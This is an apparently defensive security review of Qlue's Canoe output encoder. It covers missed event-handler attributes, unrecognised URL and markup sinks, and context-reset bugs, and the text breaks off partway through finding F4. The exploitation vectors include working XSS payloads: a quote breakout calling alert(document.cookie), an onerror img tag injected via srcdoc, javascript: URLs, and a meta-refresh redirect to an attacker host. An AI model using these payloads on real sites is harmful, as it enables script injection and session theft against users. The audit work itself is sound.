# Canoe Security Review

**Subject:** Canoe, the context-aware output encoder in Qlue
**Date:** 2026-07-25
**Revision reviewed:** `d8143b0` (master)
**Scope:** XSS resistance of automatic output encoding in the Velocity view path

---

## Summary

Canoe is not sound. Twenty-four issues are recorded below; **ten are exploitable by an attacker who
controls only data, and eight of those yield arbitrary script execution** against templates a careful
developer would consider safe. The twenty-second is an availability defect in the view factory rather
than in the encoder, found while building the production-path tests. The twenty-third is a
decoding-order defect found when the browser tier finally loaded the rendered pages: it corrupts
author data and, in two measured cases, accidentally neutralises the attacker's, which is why it
bounds F4 rather than adding to it.

The twenty-fourth was found by a random template generator (T31) on its first run, and it is the only
one in this document that refutes something the document itself asserts: the corollary below claims
attacker data can never steer Canoe's parser, and **F24 is a counterexample**. Every hand review,
including the four that went over this suite, missed it, because it needs two references in one
attribute value and nobody writes that template on purpose while looking for injections.

Canoe is three files, and there is not a single test for any of them anywhere in this repository's
git history:

| File | Role |
|---|---|
| `src/main/java/com/webkreator/qlue/view/Canoe.java` | `Writer` decorator running a char-by-char HTML tokenizer; exposes `currentContext()` and the static `encode(String,int)` dispatcher |
| `src/main/java/com/webkreator/qlue/view/velocity/CanoeReferenceInsertionHandler.java` | Velocity `ReferenceInsertionEventHandler`; intercepts every `$ref` and routes it through `Canoe.encode()` |
| `src/main/java/com/webkreator/qlue/util/HtmlEncoder.java` | The escaping primitives (`html`, `htmlWhite`, `url`, `js`, `css`, `asis`) |

Wiring lives in `VelocityViewFactory.render()` (lines 203–232): the response writer is wrapped in a
`Canoe`, an `EventCartridge` carrying `CanoeReferenceInsertionHandler` is attached to the
`VelocityContext`, and `template.merge()` writes through the `Canoe`. Auto-escaping is **on by
default** (`useAutoEscaping = true`, line 63) and cannot be disabled through any Qlue property — only
by application code calling `setAutoEscaping(false)`.

### Findings at a glance

| # | Severity | Finding |
|---|---|---|
| F1 | Critical | `onselect=` / `onsubmit=` never classified as JavaScript (wrong buffer index) |
| F2 | Critical | The `on*` allowlist misses 76 of the 94 event handler content attributes the HTML Standard defines |
| F3 | Critical | `srcdoc`, `xlink:href`, `action`, `formaction`, `content` and other URL/markup sinks unrecognised |
| F4 | High | `detectAttributePrefix()` discards the attribute's context, defeating CSS suppression |
| F5 | High | `javascript:` prefix detection reads uninitialised buffer residue |
| F6 | High | `HtmlEncoder.url()` is a scheme filter, not an origin filter |
| F7 | Medium | The `content` attribute branch tests for `data` (author-flagged) |
| F8 | Medium | No tests, no documentation, no published threat model |
| F9 | Low (latent) | `write(char[],int,int)` confuses length with end index |
| F10 | Low (latent) | `SCRIPT_END` accepts `</scriptfoo>` as a script terminator — **fixed in R17** |
| F11 | Low | Unquoted attribute references silently render as the empty string — **the attribute-value half fixed in R19** |
| F12 | Low | References inside `#set` and interpolated strings use the wrong context |
| F13 | Medium | The `[Encoding Error]` recovery branch is unreachable; every encoding error is an unhandled 500 |
| F14 | Low | A comment ending in three or more dashes never closes, suppressing the rest of the page |
| F15 | Low | `url()` silently corrupts legitimate URLs five different ways |
| F16 | Low | `js()` truncates astral code points; `css()` emits unterminated hex escapes and drops everything above U+00FF |
| F17 | High | The `detectAttributePrefix()` reset also defeats `ATTR_JS`, so a colon makes a *recognised* event handler injectable |
| F18 | Low | A comment before the DOCTYPE makes the DOCTYPE illegal — **fixed in R18** |
| F19 | Critical | `onreadystatechange=` never classified as JavaScript (the branch spells `onredystatechange`) |
| F20 | Medium | Policy-bearing attributes — `sandbox`, `rel`, `integrity`, `nonce` — arrive verbatim, and encoding is inapplicable rather than insufficient |
| F21 | Low (latent) | `currentContext()` can never return `CTX_CSS`, so the CSS arm of `encode()` is dead and enabling a CSS encoder there would change nothing |
| F22 | Low | `VelocityViewFactory` declares a `class` resource loader it never configures, so its own default properties do not start an engine |
| F23 | Low | A `style` attribute is decoded twice — HTML character references, then CSS escapes — so `html()`'s output is re-read as CSS syntax; it corrupts author data and bounds F4's blast radius to the CSS container |
| F24 | Medium | `url()` passes an `http://`/`https://` prefix through with its colon intact, which re-runs `detectAttributePrefix()` and downgrades every later reference in the same attribute value from `url()` to `html()` — **the corollary below is false** |

> **Addendum 2026-07-26.** F13, F14, F15 and F16 were found while building the test suite, and F12
> has been promoted from "unverified" to verified — it reproduces. **F17 and F18 were found while
> writing the `detectAttributePrefix()` and robustness tests (T10, T11), and F19 while reviewing
> them.** F17 is the most important of the seven: it means the review's remediation order is wrong,
> because item 1 (replace the `on*` table with a prefix rule) does not close it and deleting the
> reset does. **F19 is a third dead `on*` branch of exactly the F1 class**, found by the exhaustive
> classification test that F1 and F17 between them argued for: of the 24 `on*` names
> `setTagAttributeContext()` claims to recognise, only 21 actually classify as `ATTR_JS`. All are
> recorded below with the evidence.
>
> **Addendum 2026-07-26 (second).** **F20 was found while building out the corpus (T12)**, by working
> through Appendix A §A.2's attribute-name matrix name by name — which is exactly what that matrix is
> for. It is not a new mechanism; it is a fifth *category* of sink that the framing in
> [the systemic flaw](#the-systemic-flaw) misses. That section says `html()` is worthless for any
> attribute whose value is "subsequently parsed as **JavaScript, CSS, a URL, or markup**", and F3
> enumerates the URL, markup and refresh sinks Canoe does not recognise. Neither covers the
> attributes whose decoded value the HTML parser *itself* acts on as a directive — the ones that
> switch a security control on or off rather than naming something to fetch.
>
> **Addendum 2026-07-26 (third).** **F21 was found while writing the attribute-name matrix (T14)**,
> by asserting the `ATTR_*` classification of every name in the matrix *together with* the `CTX_*` it
> produces — which is the pairing that makes the gap visible. The mapping table in
> [the systemic flaw](#the-systemic-flaw) lists six contexts; only five of them can ever be returned.
> It is latent and has no security impact today, and it is recorded because it is a trap laid across
> the remediation path, in the same way F16 is.
>
> The same task also **corrected the count in F2's title**. "Roughly 40" was a hand count; measured
> against the HTML Standard's own list of event handler content attributes, Canoe recognises **18 of
> 94**, and the three extra names it does recognise are not in that list at all. The mechanism is
> unchanged and it is not a new finding — but the number is more than twice what the title claimed,
> and F2 is Critical, so the number is worth being right about.
>
> **Addendum 2026-07-26 (fourth).** The review of T13–T15 found that the transcription behind that
> correction was itself wrong, in two directions that partly cancelled: it cited section **8.1.7.2**
> ("Queuing tasks") instead of **8.1.8.2**, folded the first two of that section's four tables
> together and dropped the four `-webkit-` prefixed names table 1 defines
> (`onwebkitanimationend`, `onwebkitanimationiteration`, `onwebkitanimationstart`,
> `onwebkittransitionend` — all `ATTR_HTML`, all fired by a CSS animation or transition with no user
> interaction in Blink, WebKit and Gecko), and it counted table 4's `onreadystatechange` and
> `onvisibilitychange` as content attributes when the standard defines them as IDL attributes only.
> The tables are 70 + 6 + 18 = **94** content attributes. The corrected figures are **18 recognised,
> 76 missed**, and the corpus matrix is **115** names. `T16`, `T17` and `T18` landed with the same
> review; see F4, F6 and F10.
>
> **Addendum 2026-07-26 (fifth).** **F22 was found while writing the production-path test (T20)**,
> which needed an engine configured the way `buildDefaultVelocityProperties()` configures one and
> discovered that such an engine does not start. It is an availability defect in a documented
> extension point, not a security one, and it is recorded for the same reason F18 is.
>
> The same batch of tasks (T19-T24) turned the review's **central safety argument into a running
> property**. [The corollary](#corollary-attacker-data-can-never-steer-the-parser) - that attacker
> data can never move Canoe's state machine - is now `ParserSteeringTest`, quantified over every
> corpus template and every payload in the catalogue, and it holds with no counterexample. So do two
> properties the review does not state: chunking invariance (where the writer cuts the template into
> `write()` calls changes nothing, over all 9,996 two-way splits of the corpus) and structural DOM
> equivalence (no payload changes the shape of any rendered document). **F5 is now a table rather
> than an anecdote** - the outcome is decided by an integer, and the eleven-character cliff edge is
> asserted at the byte in `buf[10]` that causes it - and **F9 has a measured blast radius**: a single
> mid-point `write(char[], int, int)` desynchronises **243 of the 275** corpus templates.
>
> **Addendum 2026-07-26 (sixth).** **F23 was found by the browser tier (T25–T29)**, which is the
> first thing in this project to load Canoe's output into a real HTML parser rather than into jsoup.
> It is the only new finding the browser tier produced, and that is worth stating plainly: 128
> browser-relevant corpus rows were rendered, served over HTTP from a loopback origin and loaded in
> Chromium, and every ledger verdict held. What the browser did change is the *observability*
> record — 21 more `KNOWN_VULNERABLE` rows turned out to be rows no engine acts on, for four
> reasons the ledger could not see (a double quote cannot close a single-quoted string literal;
> `view-source:` is blocked from web content; a CSP nonce does nothing without a CSP; and the CSS
> container decides whether a `style` injection becomes a declaration). None of those is a wrong
> verdict — each row's attacker data does reach its sink live, which is what §2.1 of the test plan
> defines `KNOWN_VULNERABLE` to mean — and the fourth is F23.
>
> **Addendum 2026-07-26 (seventh, and the one that changes an argument rather than adding to it).**
> **F24 was found by a random template generator (T31) on its first run**, and it is a counterexample
> to this document's own corollary that attacker data can never steer the parser. `HtmlEncoder.url()`
> copies a matched `http://` or `https://` prefix into the output with its colon intact; Canoe's
> attribute-value scan reads that colon as a prefix delimiter and re-runs `detectAttributePrefix()`,
> which assigns `ATTR_HTML`; every later reference in the same attribute value then gets `html()`
> where the author asked for a URL. In `<a href="$base$path">` the base URL — which need not be
> attacker-controlled — decides whether the path is percent-encoded or entity-encoded, and the
> entity-encoded form hands the URL parser a raw `@`.
>
> Two things are worth taking from it. The corollary is **half** right and the halves had been
> collapsed: attacker data cannot move Canoe's *state*, which is what F10 and F14 rest on, and it can
> move the *attribute context*, which is the other input to `currentContext()`. And the property test
> that states the corollary (`ParserSteeringTest`, T23) passed over 275 templates and 52 payloads,
> because the corpus varies one reference at a time and holds the rest fixed — the hole was in the
> quantification rather than in the statement, and only a generator that did not know which shapes
> were interesting was going to find it.

**Every exploitable finding requires the template to place the reference inside an attribute.**
Plain HTML body insertion — `<p>$data</p>`, the overwhelmingly common pattern — is not affected by
any of the twenty-two injection findings, and neither F22 nor F23 is an injection finding at all. See
[What is not affected](#what-is-not-affected) before triaging; it bounds
the exploitable surface sharply and should shape the order in which templates are audited.

### Threat model

Consistent with Canoe's design intent, the attacker controls only *data* — request parameters,
database values, anything reaching a `$reference` — and never the Velocity template. The `$_x.`
bypass prefix, `$_x.asis()`, and `allowDirectOutput()` are therefore out of scope.

This matches the author's own statement of the threat model, which survives only in the demo page
deleted at commit `6d4cfcc`:

> Be aware that attackers will only control attack payload whereas you have full control over both
> the payload and the template. Still, we want to make the parser foolproof because the idea is,
> after all, to have something that works 100% of the time.

Findings F1–F11 were each hand-traced through the state machine twice, the second pass adversarially
with instructions to refute. The verdict note on each finding records what that pass established.

---

## The systemic flaw

`Canoe.encode()` maps five contexts to encoders:

```java
CTX_HTML       -> HtmlEncoder.htmlWhite(input)
CTX_HTML_ATTR  -> HtmlEncoder.htmlAttr(input)   // == html()
CTX_JS         -> ""                            // suppressed
CTX_URI        -> HtmlEncoder.url(input)
CTX_SUPPRESS   -> ""                            // default
```

> **Update — R14 closed F21 by deletion.** As found, `encode()` mapped **six** contexts and
> `currentContext()` could produce only five: the sixth, `CTX_CSS`, was never returned, because the
> `TAG_ATTR_VALUE` switch grouped `ATTR_CSS` with `ATTR_DATA`, `ATTR_CONTENT` and `ATTR_ACTIONSCRIPT`
> and returned `CTX_SUPPRESS` for all four. `style` was therefore suppressed by a `case` arm shared
> with three unrelated contexts — not by the `CTX_CSS` arm the field names implied, whose commented-out
> body would have changed nothing if enabled while its `CTX_JS` twin would have taken effect. That was
> [F21](#f21--low-latent-currentcontext-can-never-return-ctx_css). R14 kept suppressing and deleted the
> trap: the `CTX_CSS` constant, its dead `encode()` arm and both commented-out contemplation lines are
> gone, so the table above lists the five contexts that were always the only ones reachable. `style`
> values stay suppressed by design (F23: a `style` value is decoded in series, so a correct CSS encoder
> is a project, not a line). *(Since this review, R9 also added a sixth **live** context,
> `CTX_URI_RESOURCE`, for resource-loading URL sinks; it is not shown here because this section is the
> as-found record of the flaw.)*

`ATTR_HTML` is the **default** for any attribute name Canoe does not recognise
(`setTagAttributeContext()`, `Canoe.java:283`), and it maps to `CTX_HTML_ATTR` → `HtmlEncoder.html()`.

`html()` allows only `[a-zA-Z0-9]` through naked and converts *everything else* to a character
reference (`&lt;`, `&#39;`, `&#40;`, …). That is correct and complete **for attributes whose value
the browser treats as plain text** — it cannot break out of a quoted or even an unquoted attribute,
because space and `>` are encoded too.

It is worthless for any attribute whose value is subsequently parsed as **JavaScript, CSS, a URL, or
markup**, because the HTML parser decodes character references while building the attribute value,
*before* handing that value to the JS/CSS/URL/HTML parser. `onsubmit="alert&#40;1&#41;"` executes
`alert(1)`. `href="javascript&#58;alert(1)"` navigates to a `javascript:` URL. There is no character
the attacker cannot recover this way.

Canoe's safety therefore rests entirely on `setTagAttributeContext()` recognising every dangerous
attribute name. It is a hand-unrolled character-comparison **allowlist frozen around 2009**,
operating on a shared 36-char buffer that is never cleared, and it is both incomplete and buggy.
Every miss is an XSS. The complete recognised set:

- **`ATTR_URI`**: `background`, `dynsrc`, `lowsrc`, `href`, `src` — five names
- **`ATTR_CSS`**: `style` — one name
- **`ATTR_CONTENT`**: `data`
- **`ATTR_JS`**: `onabort`, `onblur`, `onchange`, `onclick`, `ondblclick`, `ondragdrop`, `onend`,
  `onerror`, `onkeydown`, `onkeypress`, `onkeyup`, `onload`, `onmousedown`, `onmousemove`,
  `onmouseout`, `onmouseover`, `onmouseup`, `onmove`, `onreset`, `onresize`,
  `onunload` — **21 names**, plus `onselect`/`onsubmit` (F1) and `onreadystatechange` (F19), which are
  written but unreachable
- **everything else**: `ATTR_HTML`

The count matters, and it was wrong here until it was measured. `setTagAttributeContext()` declares
**24** `on*` branches; exactly **21** of them can ever be taken. The three that cannot are `onselect`
and `onsubmit`, which read the wrong buffer indices (F1), and `onreadystatechange`, whose comparison
chain spells a name with no `a` in it (F19). Reading the source counts 24; running it counts 21.
`CanoeStateMachineTest.everyDeclaredOnStarBranchNameIsClassified` is the test that closed the gap,
and it exists because two of the three had already been found by hand and the third had not.

---

## What is not affected

Body-context output holds. A reference in ordinary HTML body position — `<p>$data</p>` — cannot be
used to reach any of the twenty-two injection findings. This was checked directly rather than assumed, because it
bounds how much of a given application is actually at risk.

Body references get `CTX_HTML` → `HtmlEncoder.htmlWhite()`, which is an aggressive allowlist rather
than a denylist. Exactly four categories of character survive it:

- ASCII letters and digits
- the four whitespace characters: space, tab, CR, LF
- well-formed character references, with `<`, `>`, `&`, `"`, `'`, `/` and `=` given explicit named or
  numeric forms
- the literal four-character text `\xNN` for the remaining C0 control characters

Everything else — every other punctuation mark, every non-ASCII code point — becomes `&#NNN;`.

The decisive property is that **`<` can never appear in the output**. No `<` means no tag injection,
no comment injection, and no route into any of the attribute contexts where F1 through F6 live. The
attacker is confined to text.

The edges that usually break encoders of this shape were checked and all hold:

| Edge | Result |
|---|---|
| Unterminated entities | Numeric references are always built as `&` + decimal + `;` (`HtmlEncoder.java:117-119`), so there is no loose-entity parsing to exploit |
| Astral characters | `htmlWhite` iterates `codePoints()`, emitting one correct reference per code point |
| Lone surrogates | Emit `&#55296;`, an invalid reference browsers replace with U+FFFD — mangled, not injectable |
| Charset inheritance (UTF-7 and similar) | Every Velocity response sets `Content-Type: text/html; charset=UTF-8` explicitly (`VelocityView.java:61`, `View.java:32`) |
| RCDATA / RAWTEXT elements Canoe does not model — `<textarea>`, `<title>`, `<xmp>`, `<noembed>`, `<noscript>`, `<iframe>` | Safe in both cases: in RCDATA a decoded `&lt;` is character data and never becomes a tag opener; in RAWTEXT entities are not decoded at all, so `&lt;` displays as text and the literal `</xmp` needed to escape can never be emitted |

### Why the same encoder fails in attributes

`htmlWhite()` and `html()` differ only in whether whitespace passes through raw. Both convert
everything dangerous to a character reference. In body text that ends the matter — the HTML parser
renders a character reference as a character and stops.

In an attribute value the parser *decodes* the reference and hands the decoded result to a **second**
parser — JavaScript, CSS, or the URL parser — which sees the attacker's original bytes. Same
encoder, opposite outcome, entirely because of what consumes the value afterward. That asymmetry is
the whole story of this review.

### Corollary: attacker data can never steer the parser

Because encoded output can never contain a raw `<`, and because `html()` and `url()` both neutralise
quotes (`&quot;`/`&#39;` and `%22`/`%27` respectively) so an attribute value can never be terminated
early, attacker-controlled data cannot move Canoe's state machine at all. The parser is steered only
by template literal text.

This is what makes F10 unexploitable, and it is worth preserving deliberately: any future change
that relaxes an encoder — for example replacing the `CTX_JS`/`CTX_CSS` empty-string suppression with
real escaping, as the commented-out code at `Canoe.java:1074-1081` contemplates — must be checked
against this property before it lands.

> **Corrected 2026-07-26 (T31). The paragraph above is wrong, and [F24](#f24--medium-url-passes-a-scheme-prefix-through-with-its-colon-so-attacker-data-can-steer-the-context) is the counterexample.**
> Attacker data cannot move Canoe's *state* — that half survives, and it is what F10 and F14 rest on.
> It can move the *attribute context*, which is the other input to `currentContext()`, and the
> distinction had been collapsed here. `HtmlEncoder.url()` copies a matched `http://` or `https://`
> prefix into the output unencoded; Canoe's value scan reads that colon as a prefix delimiter and
> calls `detectAttributePrefix()`, which assigns `ATTR_HTML`. So in `<a href="$base$path">` the
> attacker — or merely a configuration value — decides whether `$path` is encoded with `url()` or
> with `html()`. Four hand reviews missed it and a random template generator found it in a few
> hundred iterations, because the shape it needs is two references in one attribute value and nobody
> writes that while looking for injections.
>
> The five characters, restated correctly: `<`, `>`, `"` and `'` can move the state and no encoder
> emits any of them; `:` can move the context, and exactly one encoder path emits it.
> `ParserSteeringTest.onlyTheUriContextCanEmitARawColon` is the bound.

> **Now a running property, 2026-07-26 (T23).** `ParserSteeringTest` states this section as an
> executable claim: for every corpus template, the *sequence* of `currentContext()` values observed
> at each reference position must be identical whether the reference value is the inert marker or any
> payload in the catalogue. Measured over all 275 templates against all 52 payloads, including every
> breakout family: **no payload moves the machine anywhere**. The mechanism is asserted separately
> and more directly — no encoder `Canoe.encode()` can dispatch to emits `<`, `>`, `"` or `'` for any
> payload — so the claim rests on five functions rather than on the templates somebody chose.
>
> **The request in the paragraph above is now a test, and it names itself.** Relaxing the
> `CTX_JS`/`CTX_CSS` suppression means re-running `ParserSteeringTest` first. Today those two
> contexts pass the property *vacuously*, because they emit nothing at all; the moment they emit
> something the property becomes a real constraint on `HtmlEncoder.js()` and `HtmlEncoder.css()`,
> both of which F16 shows to be defective.
> `ParserSteeringTest.theJsAndCssContextsPassVacuouslyBecauseTheyEmitNothing` is the row that fails
> first when that change lands, and its message says what to run next.
>
> The oracle is proven non-blind, as §2.4 requires of the browser detectors: a render that puts the
> payload through the `$_x.asis()` bypass **must** break the property, and the same payload through
> an ordinary encoded reference must not. Two further properties landed with it and hold with no
> counterexample: chunking invariance (`ChunkInvarianceTest` — where the writer cuts the template
> into `write()` calls changes nothing, over every one of the 9,996 two-way splits of the corpus plus
> a seeded multi-way sample) and structural DOM equivalence (`DomEquivalenceTest` — no payload
> changes the element count, tag order or attribute names of any rendered document).

### Triage guidance

> **Verified end to end 2026-07-26 (T13).** This section was argument; it is now evidence.
> `BodyContextTest` consumes every &sect;A.1 body-context case in the corpus and asserts the decisive
> property against the *rendered document* rather than against the encoder in isolation — the payload
> contributes no `<`, `>`, `"` or `'`, checked both as a count against a render with an empty value
> (airtight) and against the extracted encoded region (readable). The distinction matters: an encoder
> that cannot emit `<` still leaves the page injectable if the reference is routed to a different
> encoder, and routing is what Canoe gets wrong everywhere else in this document.
>
> The quantification is the other half. `everyPayloadFamilyIsInertInAParagraph` puts **every** payload
> in the catalogue into `<p>$data</p>` — including the URL, CSS, policy and markup payloads that have
> no business there — because the claim is that nothing reaches a sink from body position, not that
> the families somebody thought to try do not.
> `theFourSurvivingCategoriesAreExactlyWhatTheReviewLists` pins the four categories above as literal
> rendered output, with one correction: **DEL (U+007F) is not one of the C0 controls and takes the
> ordinary reference branch**, so it renders as `&#127;` rather than as the literal `\x7F` the third
> bullet's phrasing would suggest. And `rcdataDecodesToTextAndRawtextDoesNotDecodeAtAll` asserts the
> RCDATA/RAWTEXT row's *distinction* rather than its conclusion, since the conclusion is "safe" either
> way and would hide a regression in one of the two.

The exploitable surface is confined to templates that place a reference inside an attribute. A grep
for `="$` and `='$` across the application's `.vm` files, filtered to attributes outside Canoe's six
recognised names (`href`, `src`, `background`, `dynsrc`, `lowsrc`, `style`), enumerates essentially
all of it. Templates that interpolate only into body text are safe today and remain safe under all
twenty-two injection findings, and `ParserSteeringTest` (T23) is now the executable form of that
claim. F24 does not change that: it needs a URL-bearing attribute holding two references, and the
only encoder that can emit the colon it turns on is `url()`, which body context never reaches.

---

## Findings

### F1 — Critical: `onselect=` and `onsubmit=` are never classified as JavaScript

**Location:** `Canoe.java:513-530`, inside the block guarded at line 334 by
`if ((buf[0] == 'o') && (buf[1] == 'n'))`.

```java
// onS
if (buf[0] == 's') {                 // buf[0] is provably 'o' here — dead code
    // onSelect
    if ((buf[1] == 'e') && (buf[2] == 'l') && ...
```

Every sibling branch tests `buf[2]`, `buf[3]`, … This one tests `buf[0]`, `buf[1]`, … so it asks
whether the attribute is named `select`/`submit` — impossible, since `buf[0] == 'o'` is already
established. Nothing else in the function matches `on` + `s`, so `onselect` and `onsubmit` fall
through to `ATTR_HTML` → `CTX_HTML_ATTR` → `html()`.

**Exploitation vector.** Template:

```html
<form onsubmit="return validate('$formId')">
```

Attacker sets `formId` to:

```
');alert(document.cookie);//
```

`html()` emits `&#39;&#41;&#59;alert&#40;document.cookie&#41;&#59;&#47;&#47;`. The HTML parser
decodes every one of those back to raw characters **before** the value is compiled as JavaScript.
The string literal closes, the call closes, and arbitrary JS runs on submit. `onselect` on any text
input is identical.

The contrast is what makes this dangerous: `onclick` *is* matched → `ATTR_JS` → `CTX_JS` → empty
string. A reviewer who spot-checks `onclick` concludes the mechanism works. The miss is exactly the
difference between fully suppressed and fully injectable.

There is a third dead branch of the same class, found later and by exhaustion rather than by reading:
see [F19](#f19--critical-onreadystatechange-is-never-classified-as-javascript).

> **Verified.** Dead-code claim and the full `setTagAttributeContext()` fall-through traced character
> by character. Verification found the impact *understated* in the first pass — the attacker
> recovers every character, not merely a quote breakout.

---

### F2 — Critical: the `on*` allowlist misses 76 of the 94 event handlers the HTML Standard defines

**Location:** `Canoe.java:334-539`.

There is no fallback rule of the form "any attribute whose name begins with `on` is a JS context".
The table is enumerated by hand and predates most of the modern DOM event set. Missing, among
others:

`onfocus`, `onfocusin`, `onfocusout`, `oninput`, `onbeforeinput`, `onscroll`, `ontoggle`,
`onbeforetoggle`, `onwheel`, `oncontextmenu`, `onauxclick`, `onmouseenter`, `onmouseleave`,
`onpointerdown`, `onpointerup`, `onpointerover`, `ondrag`, `ondragstart`, `ondragend`,
`ondragenter`, `ondragover`, `ondragleave`, `ondrop`, `oncopy`, `oncut`, `onpaste`,
`onanimationstart`, `onanimationend`, `ontransitionrun`, `ontransitionend`, `onplay`, `onplaying`,
`onpause`, `onended`, `oncanplay`, `onloadstart`, `onprogress`, `ontimeupdate`, `onvolumechange`,
`oninvalid`, `onsearch`, `onshow`, `ontouchstart`, `ontouchend`, `ontouchmove`, `onselectstart`,
`onselectionchange`, `oncuechange`, `onformdata`, `oncancel`, `onclose`, `onslotchange`,
`onhashchange`, `onpopstate`, `onmessage`, `onstorage`, `onoffline`, `ononline`, `onpagehide`,
`onpageshow`, `onbeforeunload`, `onafterprint`, `onbeforeprint`, `onsecuritypolicyviolation`,
`onwebkitanimationstart`, `onwebkitanimationend`, `onwebkitanimationiteration`,
`onwebkittransitionend`.

Note that `ondragdrop` **is** in the list — a Netscape 4 event that no longer exists — while HTML5's
`ondrop` and `ondragstart` are not. A good marker of the table's age.

The four `onwebkit*` names at the end of that list are the ones worth reading twice, and they were
missing from the first two counts of this finding. They are HTML Standard content attributes — the
standard defines the prefixed forms itself — they take the `ATTR_HTML` fall-through like everything
else here, and unlike almost every other handler in the list they need **no user interaction at
all**: a CSS animation or transition anywhere on the element dispatches them. With
`onanimationstart` they are the cheapest entries in the whole group to trigger.

**The count, measured rather than estimated.** *Corrected 2026-07-26, while writing T15; corrected
again the same day, while reviewing it.* This finding's title read "roughly 40" and the list above is
64 names long, both of which were hand counts of the handlers somebody thought of — which is the same
method that produced the defect. Taken against the HTML Standard's own tables of event handler
content attributes, transcribed into `src/test/resources/canoe/html-event-handler-attributes.txt`:

| | Count |
|---|---|
| Event handler content attributes the HTML Standard defines (§8.1.8.2, tables 1–3: 70 + 6 + 18) | **94** |
| …of those, recognised by `setTagAttributeContext()` | **18** |
| …of those, **missed** | **76** |
| §8.1.8.2 table 4 — `onreadystatechange`, `onvisibilitychange` — IDL attributes on `Document`, **not** content attributes, so out of the 94 | 2 |
| Additional names Canoe recognises that are not in those tables (`ondragdrop`, `onend`, `onmove`) | 3 |
| Canoe's complete reachable `ATTR_JS` set (18 + 3) | **21** |
| Handler names in the corpus matrix (the 94, the 2 IDL-only ones, the 16 defined by UI Events, CSS Animations, CSS Transitions, Pointer Events, Touch Events and the Selection API, and the 3 above) | **115** |
| …of those, injectable | **94** — 91 under this finding, plus `onselect` and `onsubmit` (F1) and `onreadystatechange` (F19) |

The mechanism is unchanged and the severity is unchanged; only the number was wrong, and it was
wrong by more than a factor of two in a Critical finding. Every one of the 115 names is now a corpus
case with a reviewed verdict, and `EventHandlerMatrixTest.everySpecEventHandlerAttributeHasACorpus`
`Case` fails if the standard's list is refreshed and a new name is not classified — so the next
revision of the HTML Standard cannot widen this finding silently.

**The 92 was wrong too, and the way it was wrong is the finding's own lesson repeated.** The first
transcription cited §8.1.7.2, which is "Queuing tasks"; the event handler tables are §8.1.8.2. It
then made two errors that partly cancelled. It merged that section's first two tables and dropped
four names from the merged result — `onwebkitanimationend`, `onwebkitanimationiteration`,
`onwebkitanimationstart` and `onwebkittransitionend`, which the HTML Standard defines itself and
which the transcriber excluded under a header note reading "CSS Animations", not having noticed that
the *unprefixed* forms are the ones CSS Animations defines. And it counted table 4's two
`Document`-only IDL attributes as content attributes. Four names too few and two too many is 92 where
the answer is 94. All four missing names are `ATTR_HTML`, all four are therefore injectable, and all
four fire from a CSS animation or transition **with no user interaction at all** — which makes them,
with `onanimationstart`, the cheapest handlers in the whole group for an attacker to trigger. The
same review corrected the header's claim that `onend` is "a pre-standard Netscape name": `onend` is a
standardised SVG animation event attribute (SVG 1.1 §19, on `animate`, `set`, `animateMotion` and
`animateTransform`) and Gecko fires it. It is outside the list because the list is derived from the
HTML Standard, not because it is dead — and its SVG siblings `onbegin` and `onrepeat` are a genuine
coverage gap, recorded in the resource file's header and absent from both the corpus and the
exclusions.

**Exploitation vector.** Identical mechanism to F1:

```html
<input value="search" onfocus="highlight('$term')">
```

`onfocus` → `ATTR_HTML` → `html()` → entity-decoded by the parser → `');alert(1);//` executes on
focus, trivially triggered via `#fragment` autofocus or a click.

> **Verified.** Each listed handler traced to the exact comparison that fails — e.g. `ondrop` fails
> `ondblclick` at `buf[3]=='r'` and `ondragdrop` at `buf[4]=='o'`; `onmouseenter` enters the
> `onmouse` branch and matches none of `d`/`m`/`o`/`u` at `buf[7]`.
>
> **Re-verified exhaustively 2026-07-26 (T15).** All 115 names are corpus cases, one reviewed verdict
> each, asserted end to end on the jsoup-decoded attribute value.
> `EventHandlerMatrixTest.everyUnrecognisedHandlerReachesTheJavaScriptParser` asserts that each of the
> 91 hands the attacker's apostrophe to the JavaScript parser, and
> `theMatrixPartitionsIntoTwentyOneRecognisedNamesAndEverythingElse` asserts the partition from the
> opposite direction to `CanoeStateMachineTest`'s source scan — that one starts from the branches the
> source declares and asks what each resolves to, this one starts from the names that exist in the
> world and asks which of them the source catches.

---

### F3 — Critical: URL-, markup-, and refresh-bearing attributes are not recognised

**Location:** `Canoe.java:281-558`.

`ATTR_URI` covers only `background`, `dynsrc`, `lowsrc`, `href`, `src`. Everything below falls
through to `ATTR_HTML`, whose entity encoding the parser undoes before the value is interpreted as a
URL or as markup:

| Attribute | Sink | Consequence |
|---|---|---|
| `srcdoc` | iframe markup | `html()` escapes `<` to `&lt;`, the parser decodes it, the iframe parses `<script>` — **same-origin XSS** |
| `xlink:href` | SVG link | `javascript:alert(1)` executes in all SVG-capable browsers |
| `action`, `formaction` | form target URL | `javascript:` URL, or arbitrary off-site submission target |
| `content` | `<meta http-equiv=refresh>` | forced redirect to an attacker origin (`0;url=//attacker.example`) |
| `poster`, `cite`, `usemap`, `longdesc`, `codebase`, `manifest`, `ping`, `srcset` | URL | scheme/origin injection, resource loading, referrer leakage |

`isTagNameChar()` accepts `:` (`Canoe.java:200`), so `xlink:href` scans as a single attribute name
and simply does not match `href`.

**Exploitation vector — `srcdoc`, the cleanest full XSS:**

```html
<iframe srcdoc="<p>Hello $name</p>"></iframe>
```

`name` = `<img src=x onerror=alert(document.domain)>` → `html()` yields
`&lt;img src&#61;x onerror&#61;alert&#40;…&#41;&gt;` → the HTML parser decodes the attribute value to
raw markup → the iframe document parses and executes it. `srcdoc` requires *double* encoding; Canoe
applies single.

**Exploitation vector — `xlink:href`:**

```html
<svg><a xlink:href="$link"><text>go</text></a></svg>
```

`link` = `javascript:alert(document.domain)` → entity-encoded, decoded by the parser, executes on
click. Note that plain `href` **is** protected by `url()`; `xlink:href`, `action` and `formaction`
are not, so the safe-by-analogy assumption a developer would make is wrong.

> **Verified.** All listed attributes traced to their failing comparison. `srcdoc` enters the
> `buf[0]=='s'` branch and fails `src` at `buf[3]=='d'` and `style` at `buf[1]=='r'`; `longdesc`
> fails `lowsrc` at `buf[2]=='n'`; `action`, `content`, `ping`, `poster`, `cite`, `usemap`,
> `codebase` and `xlink:href` have no top-level branch for their first letter at all.

---

### F4 — High: `detectAttributePrefix()` discards the attribute's context, defeating CSS suppression

**Location:** `Canoe.java:222-224`, called from `Canoe.java:918`.

```java
protected void detectAttributePrefix() {
    // Use HTML by default
    attributeContext = ATTR_HTML;      // <-- unconditional reset
```

This runs on the **first `:` at value index 0–10**. It overwrites the `attributeContext` that
`setTagAttributeContext()` derived from the attribute *name*, and if the value prefix is not one of
